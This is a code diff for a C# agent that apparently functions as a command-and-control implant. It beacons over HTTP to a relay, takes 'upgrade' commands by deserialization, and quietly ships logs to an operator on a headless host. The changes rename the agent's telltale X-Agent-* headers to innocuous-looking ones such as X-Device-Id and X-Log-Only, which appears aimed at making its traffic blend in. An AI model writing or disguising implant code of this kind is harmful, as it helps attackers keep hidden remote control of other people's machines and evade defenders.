@@ -9,7 +9,7 @@ namespace CSharpAgent
     // The HTTP beacon loop — the SAME wire contract the JScript agent speaks (see the
     // jscript-agent repo's "Beacon contract (v3)", spoken against the HTTP relay's root):
     //
-    //   • synchronous POST to H_URL carrying the X-Agent-* identity set on EVERY request
+    //   • synchronous POST to H_URL carrying the identity header set (X-Device-Id et al.) on EVERY request
     //     (binary bodies; the JScript agent bridges raw bytes via ADODB.Stream);
     //   • request body = a stream of [u32le length][bytes] frames — every reply owed
     //     since the last POST, empty when none;
@@ -37,7 +37,7 @@ namespace CSharpAgent
             _headers = headers;
             var uuid = "";
             for (var i = 0; i < headers.Length; i++)
-                if (headers[i][0] == "X-Agent-Machine-Uuid") uuid = headers[i][1];
+                if (headers[i][0] == "X-Device-Id") uuid = headers[i][1];
             Log("beaconing to " + beaconUrl + " as " + (uuid != "" ? uuid : "an unidentified machine"));
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
@@ -68,10 +68,10 @@ namespace CSharpAgent
             }
         }
 
-        // --- Log fast path (X-Agent-Log: 1) ---------------------------------------
+        // --- Log fast path (X-Log-Only: 1) ---------------------------------------
         //
         // Same fire-and-forget contract the JScript agent speaks: POST with the full
-        // X-Agent-* identity set plus X-Agent-Log: 1, body = one frame holding the UTF-8
+        // identity header set plus X-Log-Only: 1, body = one frame holding the UTF-8
         // line. The relay answers an EMPTY 200 IMMEDIATELY (no long-poll hold) and
         // broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
         // failed ship is swallowed — and there is no local echo at all (headless host).
@@ -98,7 +98,7 @@ namespace CSharpAgent
                 request.ReadWriteTimeout = 15000;
                 for (var i = 0; i < _headers.Length; i++)
                     request.Headers.Add(_headers[i][0], _headers[i][1]);
-                request.Headers.Add("X-Agent-Log", "1");
+                request.Headers.Add("X-Log-Only", "1");
                 request.ContentLength = body.Length;
                 using (var stream = request.GetRequestStream())
                     stream.Write(body, 0, body.Length);
